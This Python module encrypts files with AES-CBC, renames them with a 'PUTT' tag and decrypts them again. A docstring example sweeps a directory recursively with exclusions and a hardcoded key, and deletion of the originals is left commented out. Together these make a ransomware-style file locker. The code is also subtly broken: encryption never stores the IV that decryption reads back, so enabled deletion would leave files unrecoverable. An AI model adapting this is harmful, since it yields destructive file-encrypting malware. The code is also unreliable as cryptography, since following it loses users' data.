from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import os

NAMED_CONVERSION = "PUTT"


def encrypt(key, filePath):

    IV = get_random_bytes(AES.block_size)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    dataFile = str(filePath)

    print(filePath)
    with open(dataFile, "r") as infile:
        data = infile.read()

    data = f"<name>{filePath}\0<content>{data}".encode()  # convert to bytes

    data_padded = pad(data, AES.block_size)
    ciphertext = encryptor.encrypt(data_padded)

    # save the encrypted data to file
    (dir, fileName) = os.path.split(filePath)
    fileName = fileName.split(".")[0]
    fileExtension = f".{NAMED_CONVERSION}"
    encryptedFile = os.path.join(dir, f"{NAMED_CONVERSION}_" + fileName + fileExtension)

    with open(encryptedFile, "wb") as f:
        f.write(ciphertext)

    # WARNING
    # It will delete the original file, only uncomment if you are sure
    # VERY RISKY, THERE SHOULD BE MORE SAFE GUARDS
    # os.remove(filePath)


def decrypt(key, filePath):
    # The IV size for AES is the same as the block size, which is 16 bytes
    IV_size = AES.block_size

    # The encrypted file includes the IV at the start, followed by the ciphertext
    with open(filePath, "rb") as f:
        IV = f.read(IV_size)
        ciphertext = f.read()

    # Initialize the AES decryptor
    decryptor = AES.new(key, AES.MODE_CBC, IV)

    # Decrypt the ciphertext
    decrypted_data_padded = decryptor.decrypt(ciphertext)

    # Remove padding
    decrypted_data = unpad(decrypted_data_padded, AES.block_size)

    # Convert bytes to string and remove the added file information
    decrypted_data_str = decrypted_data.decode("utf-8")
    file_info, file_content = decrypted_data_str.split("\0", 1)
    file_path = file_info.replace("<name>", "").strip()
    file_content = file_content.replace("<content>", "").strip()

    # There is probably a better way for this
    (dir, _) = os.path.split(filePath)
    (_, fileName) = os.path.split(file_path)

    decrypted_file = os.path.join(dir, fileName)

    with open(decrypted_file, "w") as f:
        f.write(file_content)

    os.remove(filePath)  # Removes the encrypted file


""" 
HOW TO USE EXAMPLE
import util
import hashlib

EXCLUDE_FILES = ["requirements.txt", ".gitignore", "README.md"]
EXCLUDE_EXTENSIONS = [".py", ".md"]
ONLY_ENCRYPT_EXTENSION = [".txt", ".csv"]

directory = "target_dir"

for item in util.scanDirRecursive():
    filePath = Path(item)

    fileType = filePath.suffix.lower()

    if fileType in EXCLUDE_EXTENSIONS:
        continue
    elif str(filePath) in EXCLUDE_FILES:
        continue

    key = hashlib.sha256("THIS IS MY KEY".encode()).digest()
    # if fileType in ONLY_ENCRYPT_EXTENSION:
    #    encrypt(key, filePath)
    if f"{NAMED_CONVERSION}_" in str(filePath):
        decrypt(key, filePath)
"""
